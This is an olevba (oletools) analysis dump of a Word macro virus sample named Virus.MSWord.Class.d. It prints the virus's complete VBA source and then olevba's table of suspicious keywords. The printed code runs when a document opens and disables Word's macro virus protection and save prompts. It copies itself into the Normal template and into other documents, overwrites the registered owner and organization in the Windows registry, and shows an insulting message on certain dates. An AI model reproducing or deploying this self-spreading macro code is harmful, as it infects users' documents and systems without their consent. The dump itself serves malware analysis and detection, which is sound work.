olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-db7c1c805b4d799cbaba5b47673bd5eff432d37d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-db7c1c805b4d799cbaba5b47673bd5eff432d37d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Const REG_SZ As Long = 1
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Const HKEY_CURRENT_USER As Long = &H80000001
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Sub AutoOpen()
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
On Error GoTo out
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Options.VirusProtection = False
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Options.SaveNormalPrompt = False
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Options.ConfirmConversions = False
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
If nt > 70 And ad > 0 Then GoTo out
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
If nt < 70 Then
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
End If
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
host.codemodule.AddFromFile ("c:\class.sys")
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
With host.codemodule
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    For x = 1 To 16
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    .deletelines 1
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    Next x
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
End With
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
If nt < 70 Then
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    With host.codemodule
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    .replaceline 1, "Sub AutoClose()"
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    .replaceline 91, "Sub ToolsMacro()"
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    For x = 70 To 81
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
        .deletelines 62
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    Next x
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    .replaceline 35, "    For x = 1 To 4"
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    End With
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
End If
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
If nt < 70 Then
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
u = RegCloseKey(k)
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
End If
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
With host.codemodule
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    For x = 2 To 104 Step 2
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
    Next x
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
End With
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
out:
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
End Sub
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
Sub ViewVBCode()
'cmp2_hayange17/09/2003 14:27:30Lexmark  E320 on LPT1:Wood.dot
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

